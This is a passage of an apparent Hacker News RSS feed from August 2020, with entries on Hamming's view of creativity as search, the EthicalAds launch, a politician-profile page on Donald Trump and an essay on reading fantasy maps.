<p>In <em>The Art of Science and Engineering</em>  Richard Hamming writes a thought provoking essay on the topic of creativity. While reading the chapter I noticed that several of the points he made had an underlying thread that could be followed using the language of search and computation. This is something I’ve thought about in the past in a fragmented way and Hamming’s observations serve as a useful vehicle to explore these ideas further.</p>
<p>Search is both a very basic idea and a deceptively complex one. In its <a href="https://en.wikipedia.org/wiki/Search_algorithm">informal framing</a>, search problems are about using algorithms that perform computations in some well defined space to retrieve information or arrive at a solution. This definition includes optimization which immediately makes the subject ubiquitous: seen everywhere from shortest paths to gradient descent.</p>
<p>The more time you spend thinking about search, this initially myopic description grows in size until you seem to see it everywhere. At that point you begin to wonder if the analogy is totally vacuous or extremely powerful, and whether anything is gained from seeing the world this way. I think the right place to begin to think about this question is to pull apart the structure of a search problem.</p>
<p>The components of a search problem are the search algorithm, the search space and how its represented (representation), and the precise definition of the constraints/goals of the problem. In other words it’s delineated by how you search, where you search, and how you know if you’ve found what you’re looking for.</p>
<p>A more <a href="https://en.wikipedia.org/wiki/Search_problem">formal characterization</a> of search problems would rigorously define what it means to have a starting state, goal state and how to move from one state to the next. It would also be more precise about the model of computation. For the purpose of this discussion I think the higher vantage point will suffice.</p>
<p>It’s not so easy to define creativity or tease apart its components.</p>
<p>Definitions of creativity often include desiderata of novelty and originality.
Though these two concepts are related to creativity, Hamming correctly points out that there are important distinctions to be made.</p>
<p>When asked by a colleague for advice on how to do something truly original, Hamming reflects that you could simply multiply two very large numbers and rest easy knowing you were likely the first to do so. As a less contrived example, Hamming talks about modern artists producing apparently novel works of art that may not have value to the average member of the public. He also notes, self deprecatingly, that anything he painted would also have a claim to novelty but would likely not be received as creative.</p>
<p>“Value” is hard to define but it seems essential to the disentangling of these related ideas.</p>
<blockquote>
<p>Evidently we want the word “creative”
to include the concept of value –
but <em>value</em> to whom? (324)</p>
</blockquote>
<p>A search space is populated with elements, like Hamming’s large numbers, or paintings of questionable merit. From the perspective of the search problem, many of these elements may have low “value” even though they are feasible. Say the search space is images, and our representation is 1024 X 1024 X 3 channel arrays. In this space most valid elements are not what we would commonly considered a “natural” image like an object or scene. If our goal involves finding natural images, the space is primarily filled with low “value” noise.</p>
<p>In a less rigorously defined problem, or in the presence of uncertainty, matters of taste might make a solution more or less useful. A parsimonious solution may have a better chance of being correct or generalize to related problems. Seen as as an argument to the mathematical community, rather than an objectively verifiable formal object, a proof is an example of this. Among the potentially correct proofs, arguments which appeal to qualitative judgments of value are still preferred.</p>
<p>We can now try and stretch this analogy to domains where judgments of value are even more subjective and the precise structure of the search space more elusive. Imagine every great novel, painting and film as an element of a search space mostly populated by junk.</p>
<p>Sometimes novelty or originality isn’t evident but value is. Hamming points out that creativity isn’t always about generating new ideas and that combining existing ideas in a useful way is often viewed as a creative act.</p>
<blockquote>
<p>Creativity seems, among other things, to be “usefully” putting together things which were not perceived to be related before, and it may be
the <em>initial psychological</em> distance between the things which counts most. (325)</p>
</blockquote>
<p>The idea of relative distances takes us to the role of the search space and how we choose to represent it. The representation is of crucial importance since a search problem might be very difficult in one but trivial in another. A widely repeated example which illustrates this idea is that any two random points in very high dimensional spaces are likely to be orthogonal to each other with high probability. Using distances like <a href="https://en.wikipedia.org/wiki/Cosine_similarity">cosine</a> or <a href="https://en.wikipedia.org/wiki/Euclidean_distance#:~:text=In%20mathematics%2C%20the%20Euclidean%20distance,metric%20as%20the%20Pythagorean%20metric.">euclidean</a> would then prove frustratingly fruitless, since everything is “far away” from everything else. Projecting these high dimensional points onto a lower dimensional space in a way that preserves important relationships would address this pathology. In the lower dimensional space the original metrics may now yield intuitive results.</p>
<p>In the language of creativity, the utility of representations comes from our ability to make analogies. To be able to see the path from one idea to another and navigate between them.</p>
<blockquote>
<p>Probably the most important tool in creativity is the use of an <em>analogy</em>. Something seems like  something else which we knew in the past. (328)</p>
</blockquote>
<p>To be able to see these analogies, Hamming believes you need to evaluate problems from first principles and understand them deeply. He advocates approaching the same topic repeatedly from different angles and focusing on the fundamentals. By modeling the problems correctly and representing hard earned knowledge appropriately we can learn useful representations to exploit downstream.</p>
<blockquote>
<p>We find the analogies when something reminds us of something else – is it only a matter of the “hooks” we have in our minds? (329)</p>
</blockquote>
<p>Creating hooks could be viewed as learning representations that reduce the distance between things that have some essential similarity. This gives us the ability to quickly retrieve similar ideas when we encounter something new when otherwise they would not appear to have anything to do with each other.</p>
<p>Hamming believes that luck in this arena favors the prepared mind, but there seems to be a limit to the exploitation of process and habit.
Regardless of how well we can utilize analogies or any other tool of creativity, most creative acts still seem to involve periods of hard work, trial and error, inspiration, and dejection.</p>
<blockquote>
<p>Then comes the moment of “insight”, creativity or whatever you want to call it – you see the solution. Of course, it often happens that you are wrong; a closer examination of the problem shows the solution is faulty, but might be saved by some suitable revision. (327)</p>
</blockquote>
<p>The natural next question is whether the difficulties of being creative have any connection to the difficulties of search problems.</p>
<p>The difficulty of computation in search problems is studied with computational complexity theory. There exists a rich taxonomy of problem classes with rigorous inclusion criteria and well studied properties. For the purposes of this discussion a simpler division into three rough classes of problems will do.</p>
<p>The first class, <a href="https://en.wikipedia.org/wiki/P_(complexity)"><em>P</em></a>, contains those problems that can be solved efficiently, in polynomial time for all inputs. The second, <a href="https://en.wikipedia.org/wiki/EXPTIME"><em>EXP</em></a>, contains problems that cannot be solved efficiently and require exponential time in general.</p>
<p>There is a third class called <a href="https://en.wikipedia.org/wiki/NP_(complexity)"><em>NP</em></a>, which stands for non-deterministic polynomial time. Problems in  <em>NP</em>  have the interesting property that correct solutions can be verified efficiently even though no general efficient algorithms exist to arrive at these solutions. Whether polynomial time algorithms for these problems exist at all is a famous open question (<a href="https://en.wikipedia.org/wiki/P_versus_NP_problem">P=NP?</a>), but it’s suspected that there aren’t.</p>
<blockquote>
<p>The false starts and false solutions often sharpen the next approach you try. You now know how not to do it! You have a smaller number of approaches left to explore. You have a better idea of what will not work and possibly why it will not work. (327)</p>
</blockquote>
<p>Often there is no way to arrive at a good solution without trial and error, moments of insight, randomness and luck, even if in hindsight you can see the clear and simple path. This reminds me of <em>NP</em>, in that it’s easier to  appreciate the realized path retroactively than it is to find the correct path prospectively.</p>
<p>In our definition of $P$, one thing that was glossed over is what “efficient” means. Algorithms that run in polynomial time can still have high leading exponents or constant factors. Consider $X$ vs $100 * X$ or $X^{100}$, the second scales much worse than the first, and the third isn’t “efficient” in any practical sense. These factors often make all the difference in practice even if they don’t affect an algorithm’s membership in the complexity zoo.</p>
<p>In the same way, the difference between an impossible creative act and a tractable one may be the ability to reduce the “constant factor” via the representation of the search space, good heuristics and amount of “compute”.</p>
<p>There are other times where even in hindsight the creative act appears miraculous and just as difficult to appreciate. Here, maybe luck or inspiration play a bigger role than anything else. It’s about stumbling upon the winning path to the solution for a particular instance of a generally difficult class of problems.</p>
<p>Since I’m currently immersed in machine learning and AI, I want to include some brief connections to those topics. This might be a case of “when you have a hammer everything looks like a nail”, but I think the links are suggestive enough to mention.</p>
<p>Since much of …</p></article></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://vishakh.me/posts/creativity_search/">https://vishakh.me/posts/creativity_search/</a></em></p>]]>
            </description>
            <link>https://vishakh.me/posts/creativity_search/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24265452</guid>
            <pubDate>Mon, 24 Aug 2020 21:00:44 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Craigslist for Remote Jobs]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24265402">thread link</a>) | @justaashir
<br/>
August 24, 2020 | https://remoteworkjar.com/browse-remote-jobs | <a href="https://web.archive.org/web/*/https://remoteworkjar.com/browse-remote-jobs">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://remoteworkjar.com/browse-remote-jobs</link>
            <guid isPermaLink="false">hacker-news-small-sites-24265402</guid>
            <pubDate>Mon, 24 Aug 2020 20:54:56 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Announcing EthicalAds: a privacy-focused ad network for developers]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 2 (<a href="https://news.ycombinator.com/item?id=24265336">thread link</a>) | @forsaken
<br/>
August 24, 2020 | https://www.ethicalads.io/blog/2020/08/announcing-ethicalads/ | <a href="https://web.archive.org/web/*/https://www.ethicalads.io/blog/2020/08/announcing-ethicalads/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
      <article>
        

        <p>
          <span>By Eric Holscher, David Fischer on </span>
          <time datetime="2020-08-24T00:00:00-07:00">Aug 24</time>
        </p>

          

        <p>We're excited to announce the release of EthicalAds,
a privacy-focused ad network for developers.
We think advertising is one of the best ways to fund open source development,
and we have first hand experience.
Ethical advertising was first created to make Read the Docs,
our own open source project,
sustainable.
We're now bringing ethical ads to other developers.</p>
<p>We've found that privacy preserving ads are a win for both developers and advertisers.
Advertisers are able to target developers on the sites they frequent without being blocked.
Developers trust our ads because our code is open source, and we're developers ourselves.</p>
<h2 id="the-background">The background</h2>
<p>Ethical advertising as a concept was something we <a href="https://www.ericholscher.com/blog/2016/aug/31/funding-oss-marketing-money/#funding-read-the-docs">originally conceived</a> for Read the Docs back in 2016.
We were an open source project trying to find sustainability,
and advertising was the answer we knew we needed.
We knew our users cared about privacy,
so we decided to build the most privacy-focused ad solution we could.
We have been working on building a sturdy business around advertising ever since.</p>
<p>As we started building this vision,
we were inspired to see CodeFund adopt our ideals and push them forward.
We were sad when we heard CodeFund was <a href="https://twitter.com/codefundio/status/1278119643937296384">shutting down</a> on July 1 of this year.
We talked with Eric Berry at CodeFund,
deciding to launch our network in beta to provide a smooth transition for the people depending on that money each month.</p>
<p>We've spent the last month onboarding over 50 publishers.
<strong>Developers have already earned more than $5,000 since we launched</strong>.
We're excited to officially announce that we're open for additional publishers and advertisers.</p>
<h2 id="our-vision">Our vision</h2>
<p>Ethical ads respect users while still providing value to advertisers.
The vision is pretty simple:</p>
<ul>
<li>We don’t track you or sell your data</li>
<li>We only make money showing ads, so our interests are fully aligned</li>
<li>We target ads based on the content of the current page, not your past browsing history</li>
<li>We are as transparent in our business as possible</li>
<li>We only show high quality ads from companies that are of interest to developers.</li>
</ul>
<p>As we talked about in our <a href="https://blog.readthedocs.com/ethical-advertising-works/">2018 blog post</a>: <strong>ethical advertising works</strong>.
We're thrilled to be able to bring our vision of advertising to a larger audience,
and help fund open source without compromise.
Our <a href="https://github.com/readthedocs/ethical-ad-server">entire ad server</a> is open source,
so you can inspect how we're doing things.
We believe strongly in open source,
and we practice what we preach.</p>
<h2 id="join-us">Join us</h2>
<p>We are planning to grow slowly in the near term,
making sure that everything we've built is ready for new demands.
We've already learned a number of lessons in the last month,
and we want to make sure our ads work well for everyone.</p>
<p>Ethical advertising is our vision for the future of internet advertising,
and we hope that you'll join us.
We have space for additional publishers and advertisers,
and look forward to building something meaningful with you:</p>
<ul>
<li>Become a <a href="https://www.ethicalads.io/publishers/">publisher</a> today</li>
<li>Become an <a href="https://www.ethicalads.io/advertisers/">advertiser</a> today</li>
<li>Follow our journey in our <a href="https://ethicalads.us17.list-manage.com/subscribe?u=ca5e74de3ea2867d373058271&amp;id=5746f18bb8">newsletter</a></li>
</ul>
      </article>
    </div></div>]]>
            </description>
            <link>https://www.ethicalads.io/blog/2020/08/announcing-ethicalads/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24265336</guid>
            <pubDate>Mon, 24 Aug 2020 20:48:48 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: Not happy with your politician? Give him feedback]]>
            </title>
            <description>
<![CDATA[
Score 6 | Comments 3 (<a href="https://news.ycombinator.com/item?id=24265197">thread link</a>) | @jldev
<br/>
August 24, 2020 | https://www.politicianreport.org/ratings/donald-trump | <a href="https://web.archive.org/web/*/https://www.politicianreport.org/ratings/donald-trump">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="nav-tabContent">

				<!--Begin Overview-->
				<div id="nav-overview" role="tabpanel" aria-labelledby="nav-overview-tab">

					<!--Summary-->
					<div>
						<p>Donald Trump is the 45th president of the United States.</p><p>On June 16, 2015, Trump announced his bid for the presidency at Trump Tower in New York City. Trump said, "I am officially running for president of the United States, and we are going to make our country great again."</p>
						
					</div>
					<!--end Summary-->
					                                          

					<!--begin List-->
					<!--<div class="card mt-4 p-4">
						<h2>Title</h2>
							<ul class="list-group">
								<li class="list-group-item"><i class="far fa-globe pr-3"></i><a href="test.com">Visit Website</a></li>
								<li class="list-group-item"><i class="far fa-phone pr-3"></i> 123-456-5465</li>
								<li class="list-group-item"><i class="far fa-envelope pr-3"></i> Email email</li>
							</ul>
					</div>-->
					<!--end List-->

					<!--side by side-->
					<!--end row-->
				</div><!--end overview-->


				<!--begin Experience-->
				<div id="nav-experience" role="tabpanel" aria-labelledby="nav-experience-tab">
					<div>
						<h2>Professional Experience</h2>
						<ul>
					 		<li>
					 			<div>
						 			<p><span>The Trump Organization   -   Founder/Chair/President/Chief Executive Officer</span></p>
						 			<p><span>1975-2017</span></p>
						 		</div>
						 	</li>
					 		<li>
					 			<div>
						 			<p><span>"The Apprentice"   -   Producer</span></p>
						 			<p><span>2004-2015</span></p>
						 		</div>
						 	</li>
					 		<li>
					 			<div>
						 			<p><span>Trump Hotels and Casino Resorts, Incorporated   -   Chair</span></p>
						 			
						 		</div>
						 	</li>
					 		<li>
					 			<div>
						 			<p><span>Trump University   -   Co-Founder</span></p>
						 			
						 		</div>
						 	</li>
					 		<li>
					 			
						 	</li>
					 		<li>
					 			<div>
						 			<p><span>"The Celebrity Apprentice"   -   Former Host</span></p>
						 			
						 		</div>
						 	</li>
					 		<li>
					 			<div>
						 			<p><span>Miss Universe Organization   -   Former Owner</span></p>
						 			
						 		</div>
						 	</li>
					 		<li>
					 			<div>
						 			<p><span>New Jersey Generals   -   Former Owner</span></p>
						 			
						 		</div>
						 	</li>
					 		<li>
					 			<div>
						 			<p><span>Trump Shuttle   -   Former Owner</span></p>
						 			
						 		</div>
						 	</li>
						</ul>
					</div>
					<div>
						<h2>Political Experience</h2>
						<ul>
					 		<li>
					 			<div>
						 			<p><span>President of the United States of America   -   Candidate</span></p>
						 			<p><span>2020</span></p>
					 			</div>
						 	</li>
					 		<li>
					 			<div>
						 			<p><span>United States of America   -   President</span></p>
						 			<p><span>2017-present</span></p>
					 			</div>
						 	</li>
						</ul>
					</div>

					<div>
						<h2>Religious, Civic, and Other Memberships</h2>
						<ul>
					 		<li>
					 			<div>
							 		<p><span>The Nation's Parade   -   Grand Marshal</span></p>
							 		<p><span>1995</span></p>
					 			</div>
							</li>
					 		<li>
					 			<div>
							 		<p><span>Board of Directors, Police Athletic League   -   Member</span></p>
							 		
					 			</div>
							</li>
					 		<li>
					 			<div>
							 		<p><span>United Cerebral Palsy   -   Advisory Board Member</span></p>
							 		
					 			</div>
							</li>
					 		<li>
					 			<div>
							 		<p><span>Lenox Hill Hospital   -   Advisory Board Member</span></p>
							 		
					 			</div>
							</li>
					 		<li>
					 			<div>
							 		<p><span>New York Vietnam Veterans Memorial Fund   -   Co-Chair</span></p>
							 		
					 			</div>
							</li>
					 		<li>
					 			<div>
							 		<p><span>Donald J. Trump Foundation   -   Former Chair</span></p>
							 		
					 			</div>
							</li>
					 		<li>
					 			<div>
							 		<p><span>Celebration of Nations   -   Former Committee Member</span></p>
							 		
					 			</div>
							</li>
					 		<li>
					 			<div>
							 		<p><span>Committee to Complete Construction of the Cathedral of Saint John the Divine   -   Founding Member</span></p>
							 		
					 			</div>
							</li>
					 		<li>
					 			<div>
							 		<p><span>The Wharton School Real Estate Center   -   Founding Member</span></p>
							 		
					 			</div>
							</li>
					 		<li>
					 			<div>
							 		<p><span>Benefactors Board of Directors, Historical Society of Palm Beach County   -   Member</span></p>
							 		
					 			</div>
							</li>
					 		<li>
					 			<div>
							 		<p><span>Presidents Council of New York University   -   Member</span></p>
							 		
					 			</div>
							</li>
						 </ul>
					</div>

					<div>
						<h2>Education</h2>
						<ul>
					 		<li>
					 			<div>
									<p><span>BS
									Economics/Real Estate - Wharton School of Finance, University of Pennsylvania</span></p>
									<p><span>1968 </span></p>
					 			</div>

							</li>
					 		<li>
					 			<div>
									<p><span>Attended
									 - Fordham University</span></p>
									<p><span>1964-1966 </span></p>
					 			</div>

							</li>
						 </ul>
					</div>



				</div>
				<!--end Experience-->





				<div id="nav-voting" role="tabpanel" aria-labelledby="nav-voting-tab">
					<div id="accordionExample">
                <div>
                  <div id="heading0" data-toggle="collapse" data-target="#collapse0" aria-expanded="false" aria-controls="collapse0">
                    <div>
                      <div>
                        <h4>Budget, Spending and Taxes</h4>
                      </div>
                      <!--<div class="col-md-5 col-sm-10 text-right"></div>-->

                      <!--end col-->
                    </div><!--end row-->
                  </div><!--end card body-->
                  <!--end collapse-->
                </div><!--end card-->
                <div>
                  <!--end card body-->
                  <div id="collapse1" aria-labelledby="heading1" data-parent="#accordionExample">
                    <div>
                      <ul>
                          <li>
                            <p> 2017</p>
                            <div>
                              <div>
                                <p>
                                  <h4>
                                      <i></i> Signed
                                  </h4>
                                </p>
                                <p> First Step Act of 2018
                                    (2017)</p>
                              </div>
                            </div>
                          </li>
                      </ul><!--end vote-->
                    </div><!--end card body-->
                  </div><!--end collapse-->
                </div><!--end card-->
                <div>
                  <!--end card body-->
                  <div id="collapse2" aria-labelledby="heading2" data-parent="#accordionExample">
                    <div>
                      <ul>
                          <li>
                            <p> 2019</p>
                            <div>
                              <div>
                                <p>
                                  <h4>
                                      <i></i> Signed
                                  </h4>
                                </p>
                                <p> National Defense Authorization Act for Fiscal Year 2020
                                    (2019)</p>
                              </div>
                            </div>
                          </li>
                      </ul><!--end vote-->
                    </div><!--end card body-->
                  </div><!--end collapse-->
                </div><!--end card-->
                <div>
                  <!--end card body-->
                  <div id="collapse3" aria-labelledby="heading3" data-parent="#accordionExample">
                    <div>
                      <ul>
                          <li>
                            <p> 2018</p>
                            <div>
                              <div>
                                <p>
                                  <h4>
                                      <i></i> Nominated
                                  </h4>
                                </p>
                                <p> Nomination of James Blew to Assistant Secretary for Planning, Evaluation, and Policy Development for the Department of Education
                                    (2018)</p>
                              </div>
                            </div>
                          </li>
                      </ul><!--end vote-->
                    </div><!--end card body-->
                  </div><!--end collapse-->
                </div><!--end card-->
                <div>
                  <!--end card body-->
                  <div id="collapse4" aria-labelledby="heading4" data-parent="#accordionExample">
                    <div>
                      <ul>
                          <li>
                            <p> 2019</p>
                            <div>
                              <div>
                                <p>
                                  <h4>
                                      <i></i> Nominated
                                  </h4>
                                </p>
                                <p> Nomination of Andrew Wheeler to be Administrator of Environmental Protection Agency
                                    (2019)</p>
                              </div>
                            </div>
                          </li>
                          <li>
                            <p> 2018</p>
                            <div>
                              <div>
                                <p>
                                  <h4>
                                      <i></i> Nominated
                                  </h4>
                                </p>
                                <p> Nomination of Andrew Wheeler to Deputy Administrator of the Environmental Protection Agency
                                    (2018)</p>
                              </div>
                            </div>
                          </li>
                      </ul><!--end vote-->
                    </div><!--end card body-->
                  </div><!--end collapse-->
                </div><!--end card-->
                <div>
                  <!--end card body-->
                  <div id="collapse5" aria-labelledby="heading5" data-parent="#accordionExample">
                    <div>
                      <ul>
                          <li>
                            <p> 2019</p>
                            <div>
                              <div>
                                <p>
                                  <h4>
                                      <i></i> Nominated
                                  </h4>
                                </p>
                                <p> Nomination of Dan Brouillette as the Secretary of Energy
                                    (2019)</p>
                              </div>
                            </div>
                          </li>
                          <li>
                            <p> 2019</p>
                            <div>
                              <div>
                                <p>
                                  <h4>
                                      <i></i> Nominated
                                  </h4>
                                </p>
                                <p> Nomination of Jeffrey Rosen to be Deputy Attorney General for the Department of Justice
                                    (2019)</p>
                              </div>
                            </div>
                          </li>
                          <li>
                            <p> 2019</p>
                            <div>
                              <div>
                                <p>
                                  <h4>
                                      <i></i> Nominated
                                  </h4>
                                </p>
                                <p> Nomination of Mark Esper as the Secretary of Defense
                                    (2019)</p>
                              </div>
                            </div>
                          </li>
                          <li>
                            <p> 2019</p>
                            <div>
                              <div>
                                <p>
                                  <h4>
                                      <i></i> Nominated
                                  </h4>
                                </p>
                                <p> Nomination of William Pelham Barr to be Attorney General of the Department of Justice
                                    (2019)</p>
                              </div>
                            </div>
                          </li>
                          <li>
                            <p> 2018</p>
                            <div>
                              <div>
                                <p>
                                  <h4>
                                      <i></i> Nominated
                                  </h4>
                                </p>
                                <p> Nomination of Brian Allen Benczkowski to be Assistant Attorney General
                                    (2018)</p>
                              </div>
                            </div>
                          </li>
                          <li>
                            <p> 2017</p>
                            <div>
                              <div>
                                <p>
                                  <h4>
                                      <i></i> Nominated
                                  </h4>
                                </p>
                                <p> Nomination of Alexander Acosta to be Secretary of Labor
                                    (2017)</p>
                              </div>
                            </div>
                          </li>
                          <li>
                            <p> 2017</p>
                            <div>
                              <div>
                                <p>
                                  <h4>
                                      <i></i> Nominated
                                  </h4>
        …</p></div></div></li></ul></div></div></div></div></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.politicianreport.org/ratings/donald-trump">https://www.politicianreport.org/ratings/donald-trump</a></em></p>]]>
            </description>
            <link>https://www.politicianreport.org/ratings/donald-trump</link>
            <guid isPermaLink="false">hacker-news-small-sites-24265197</guid>
            <pubDate>Mon, 24 Aug 2020 20:34:11 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Here Be Cartographers: Reading the Fantasy Map (2011)]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24265135">thread link</a>) | @juanuys
<br/>
August 24, 2020 | http://www.nicholastam.ca/2011/04/18/here-be-cartographers-reading-the-fantasy-map/ | <a href="https://web.archive.org/web/*/http://www.nicholastam.ca/2011/04/18/here-be-cartographers-reading-the-fantasy-map/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
              <p><img src="http://www.nicholastam.ca/wp-content/uploads/2011/04/phantom-tollbooth-map.jpg" alt="" title="Map from Norton Juster's 'The Phantom Tollbooth' (Random House, 1961), illustrated by Jules Feiffer." width="480" height="373"></p>
<p>It is hard to imagine a world without maps.</p>
<p>Now stop—and diagram that sentence. Break its syntax apart. You can parse it in at least two valid and meaningful ways:</p>
<ul>
<li>
<strong>It is hard | to imagine | a world without maps.</strong> The use of maps is so embedded in our daily lives, so essential to our normal functioning, that the idea of a pre-cartographic society is as alien as the thought of a pre-literate one. On top of this, our idea of what it means to be a mapped society is itself confined to our familiarized expectations of what maps are like. How did people get by without maps—or rather, without the sorts of maps we know and understand?
</li>
<li>
<strong>It is hard | to imagine a world | without maps.</strong> Maps govern the way we think about space, and that extends to imaginary or hypothetical spaces. Without a graphic representation on paper or in our heads, our plans for things not yet built—homes, roads, electric circuits—may be cloudy and ambiguous. They may lack precision in the same way we have trouble with describing things that are outside our linguistic abilities. This is a negative definition of maps as a form of language: to be without a map is to be without language, and it impedes us from communicating ideas in the mind—to others, yes, but also to ourselves.
</li>
</ul>
<p>In both of these senses, maps of fictional places are remarkably challenging texts.</p>
<p>One of my chief interests in fiction, along with art in general, is how it presents itself as evidence of the way people receive the existing cultural data around them before they process it and spit it back out. (In literary criticism you will encounter words like <em>allusion</em> and <em>intertextuality</em>, but I think of them as subtypes of a broader cognitive activity.) When an author plans out a story’s setting in place, or when a reader attempts to reconstruct it from the words alone, the maps they produce tell us not only how they imagine the depicted geography, but also how they imagine <em>the idea of maps</em>. Furthermore, the author/audience distinction isn’t always sharp: some privileged readers, such as the illustrators at a publishing house or manuscript historians like Christopher Tolkien, participate in the interpretive stage as well as the official construction of the space for everyone else.</p>
<p>So when we open up a novel to find a map, we can think of the map as an act of narration. But what kind of narration? Is it reliable narration or a deliberate misdirection? Is it omniscient knowledge, a complete (or strategically obscured) presentation of the world as the author knows it? Or is the map available to the characters in the text? If it is, then who drew up the map, and how did they have access to the information used to compose it? If it isn’t, then through what resources do the characters orient themselves in their own world? And finally, does anyone even bother to think about these questions before they sit down to place their woodlands and forts?</p>
<p>In the post that follows, I am going to informally sketch out a theory of fictional maps, which is to say that I will put up a lot of pretty pictures from novels and talk about why they are neat. There is likely some academic work on this somewhere—I would be astonished if there weren’t—but I’m not aware of any, and certainly nothing that has accounted for modern critical approaches to the history of cartography. Map history and the comparative study of commercial genre literature are niches within niches as it stands, and my aim is to entwine them together.</p>

<h3>Perspective</h3>
<p>Let’s begin with something familiar.</p>
<p><img src="http://www.nicholastam.ca/wp-content/uploads/2011/04/thrors-map-endleaf.jpg" alt="" title="Thrór's map in the first edition of J.R.R. Tolkien's 'The Hobbit' (George Allen &amp; Unwin, 1937), illustrated by the author." width="480" height="365"></p>
<p>Depending on how you look at it, this map is one of the following:</p>
<ul>
<li>The map that J.R.R. Tolkien drew up for <em>The Hobbit</em>, which appears in the endleaf of the original 1937 edition as well as most (if not all) of the English editions still in print today.</li>
<li>A map drawn by the dwarvish king Thrór depicting the environs of Erebor, the Lonely Mountain. Elrond deciphers the runes in Chapter III (“A Short Rest”).</li>
<li>A reproduction of Thrór’s map, copied and translated by the hobbit Bilbo Baggins.</li>
<li>A reproduction of Bilbo’s copy of Thrór’s map, received and delivered by one J.R.R. Tolkien from <em>There and Back Again</em>, the first part of the discovered manuscript known as the Red Book of Westmarch.</li>
</ul>
<p>The complexity of the document is that it serves as all of these things at once. As Tolkien’s map, which we recognize to be a fictitious construction along with the rest of the text, the map is a device to orient the reader in an imagined world. But if we dive inside the fiction, the map is also Tolkien’s way of reporting to his readers what Bilbo and Thorin were looking at—no different than if your copy of the book came bundled with a replica of Bilbo’s sword, Sting.</p>
<p>What’s more, in style and technique the map is fully believable as something put together by the dwarves (apart from the lettering in English, which we can think of as Bilbo’s translation if we wish to suspend disbelief). Notice that rather than being a high-fidelity communiqué of how Tolkien imagined Middle-Earth, the map is a minimalist sketch of the world according to the dwarves. The sparsely chosen landmarks appear in relative (not absolute) position, the illustrations are abstract, and the inscriptions allude to people and events that would have been known to Thrór. Scale doesn’t even enter into the equation. (Tolkien’s original draft, which I’ll say more about later on, was even sparser: aside from the runes and text, its only graphic elements were the Running River and a top-down outline of the Lonely Mountain.)</p>
<p>Not to be neglected, of course, is that the map also functions as a two-layered riddle. In <em>The Hobbit</em>, we learn that while the runes on the left (in red above) are directly visible—”five feet high the door and three may walk abreast,” they read—the runes in the centre only reveal themselves when Elrond holds the map up to the light of the moon. (<a href="http://www.indyprops.com/pp-hobmap.htm">This custom-made replica</a> demonstrates the effect.) The moon-runes provide a further clue: “Stand by the grey stone when the thrush knocks, and the setting sun with the last light of Durin’s Day will shine upon the key-hole.”</p>
<p>To complicate things further, when the dwarves first lay out the map in Chapter I (“An Unexpected Party”), Tolkien makes an authorial interjection in the text:</p>
<blockquote><p>“There is one point that you haven’t noticed,” said the wizard, “and that is the secret entrance. You see that rune on the West side, and the hand pointing to it from the other runes? That marks a hidden passage to the Lower Halls.” (Look at the map at the beginning of this book, and you will see there the runes in red.)</p></blockquote>
<p>Not only that, but it will say this in the text whether your edition has the map printed in red and black or not! (Now that we’re in the age of paperback dominance, it’s unlikely that this is the case for you.)</p>
<p><img src="http://www.nicholastam.ca/wp-content/uploads/2011/04/thrors-map-runes.jpg" alt="" title="What Thrór's map may have looked like to Bilbo Baggins, as imagined by the proprietor of www.indyprops.com. Notice that the lettering is entirely runic, and the central moon-runes are scarcely visible." width="480" height="304"></p>
<p>So the multifaceted nature of the map isn’t limited to its plurality of authors, each at a different level of absorption into the fictional world; also in play is a plurality of potential readers. Tolkien’s real-world readers aren’t expected to go in knowing how to decipher the runes (though nowadays, you’d be surprised at how many of them do). But the further concealment of the moon-runes tells us that within the narrative, the mapmaker had a restricted audience in mind.</p>
<p>If the map is an act of narration, what kind of narration is it? We have a good system for answering this type of question with respect to prose. First, there is the distinction of <em>person</em>—first, second, or third—which is largely a question of using pronouns to position the narrator and reader in relation to the action. The concept of person doesn’t map neatly onto cartographic works, however, unless there are pronouns involved. A better apparatus for distinguishing between the possible authors of a fictional map is what literary scholars call levels of <em>diegesis</em>—a technical way of delineating whether something is outside the text, inside the text, or inside a text within the text.</p>
<p>At minimum we are always dealing with three layers of reality, though they are not always separate: the author, the narrator, and the characters. In non-fiction, for instance, we observe no distance between the author and the narrator, and we assume that the inhabit the same plane. In the most basic form of first-person narration, we assume that the narrator is among the reality of the characters, even if he or she is far removed from the action. If we think about maps in diegetic terms—if we ask whether the documents and their authors belong to the world in the book, or if they come from outside—we unlock two of the most powerful concepts for thinking about perspective: <em>omniscience</em> and <em>reliability</em>.</p>
<p><img src="http://www.nicholastam.ca/wp-content/uploads/2011/04/princess-bride-map.jpg" alt="" title="Map from William Goldman's metafictional masterwork, 'The Princess Bride' (1973). Incidentally, this book is a good stress test for any narrative theory that deals with levels of diegesis." width="480" height="511"></p>
<h3>Diegesis</h3>
<p>What’s the appeal of a fantasy map, anyway? I doubt too many would disagree when I assert that maps add to the sense of immersion. If they come directly from the author—keeping in mind the intermediaries of the publisher and illustrator, too—a map tells the reader that the creator of the fictional space has really thought this place out. Storytelling always happens in façades, but evidence of the author’s forethought fills out the setting’s illusion of depth.</p>
<p>If we see a map of an imaginary land, we feel like we know more about the place. Like any supplementary material—timelines, family trees—it satisfies our latent curiosities. Also present, I think, is an element of bowing to the world-builder’s authority: by looking at a map we don’t simply know more about the world—we know more about <em>how the author imagined the world to be</em>.</p>
